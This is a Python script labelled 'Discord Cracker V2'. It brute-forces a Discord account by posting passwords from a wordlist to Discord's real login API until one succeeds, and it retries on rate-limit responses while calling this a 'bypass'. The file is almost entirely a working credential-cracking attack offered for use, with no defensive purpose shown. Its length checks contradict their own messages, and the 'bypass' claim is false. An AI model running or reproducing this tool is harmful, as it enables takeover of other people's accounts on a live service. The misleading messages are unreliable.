import requests
from colorama import Fore, Style
from datetime import datetime
import os
import time

start_time = None 

def log(message, level="INFO"):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    if level == "INFO":
        print(f"{timestamp} {Fore.GREEN}[INFO]{Fore.RESET} {message}")
    elif level == "WARNING":
        print(f"{timestamp} {Fore.YELLOW}[WARNING]{Fore.RESET} {message}")
    elif level == "ERROR":
        print(f"{timestamp} {Fore.RED}[ERROR]{Fore.RESET} {message}")
    else:
        print(message)

def start_timer():
    global start_time
    start_time = time.time()

def stop_timer():
    global start_time
    end_time = time.time()
    elapsed_time = end_time - start_time
    elapsed_time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
    return elapsed_time_str

def main():
    log("YT: Discord Cracker V2")
    log("--------------------")

    email = input("Enter your email: ")

    log("1: Normal login")
    log("2: Brute Force")
    select = input()

    if select == "2":
        password_file_path = input("Enter the path to the password file: ")

        if not os.path.exists(password_file_path):
            log("Password file not found. Exiting...", "ERROR")
            return

        with open(password_file_path, 'r') as file:
            passwords = file.read().splitlines()

        passwords = [password for password in passwords if len(password) >= 8]

        if not passwords:
            log("No passwords with exactly 8 characters found. Exiting...", "ERROR")
            return

        log("Trying passwords...\n")

        start_timer()

        for password in passwords:
            log(f"Testing password: {password}... ", "INFO")
            login_result = test_login(email, password)

            if login_result:
                log("\n\n\nCracked successful!", "INFO")
                log(f"email: {email}", "INFO")
                log(f"password: {password}", "INFO")
                elapsed_time_str = stop_timer()  # Stop the timer
                log(f"Time taken: {elapsed_time_str}", "INFO")
                break
            else:
                log("Login failed.")

        log("\nCracked complete.")
    else:
        password = input("Enter your password: ")

        if len(password) >= 8:
            log("Password must be exactly 8 characters. Exiting...", "ERROR")
            return

        start_timer()

        while True:
            log(f"Trying password: {password}... ", "INFO")
            login_result = test_login(email, password)

            if login_result:
                log("Login successful!", "INFO")
                elapsed_time_str = stop_timer()  # Stop the timer
                log(f"Time taken: {elapsed_time_str}", "INFO")
                break
            else:
                log("Login failed.")

def test_login(email, password):
    try:
        time.sleep(0.13)
        request_url = "https://discord.com/api/v9/auth/login"
        headers = {"Host": "discord.com"}
        data = {"login": email, "password": password}
        response = requests.post(request_url, headers=headers, json=data)

        if response.status_code == 200:
            return True
        elif response.status_code == 429:
            log("YT: Too Many Requests Bypass Statuscode 429 successful!", "INFO")
            return test_login(email, password)
        else:
            log(response.status_code, "INFO")
            return False
    except Exception as ex:
        log(f"YT: An error occurred: {str(ex)}", "ERROR")
        return False

if __name__ == "__main__":
    main()
